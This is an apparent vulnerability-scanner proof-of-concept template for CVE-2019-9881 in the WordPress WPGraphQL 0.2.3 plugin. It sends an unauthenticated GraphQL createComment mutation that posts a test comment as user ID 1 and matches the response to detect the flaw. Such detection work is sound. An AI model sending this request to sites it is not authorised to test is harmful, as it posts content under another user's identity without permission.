[info]
author = "ave"
description = "验证WPGraphQL 0.2.3插件是否存在未认证评论发布漏洞，通过发送GraphQL createComment变异请求检测目标站点是否允许未认证用户发布评论"
id = "POC-AVE-2019-0223"
name = "WordPress WPGraphQL 0.2.3 Unauthenticated Comment Posting PoC"
severity = "medium"
tags = ["ave-2019-0223"]
vuln_id = [
    "CVE-2019-9881",
    "AVE-2019-0223",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/graphql"
protocol = "http"

[poc.requests.body]
content = '{"query": "mutation { createComment(input: { postId: 1, userId: 1, content: \"AVETest\", clientMutationId: \"AVEClient\" }) { clientMutationId } }"}'
type = "json"

[poc.requests.headers]
Content-Type = "application/json"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["createComment"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["clientMutationId"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVEClient"]
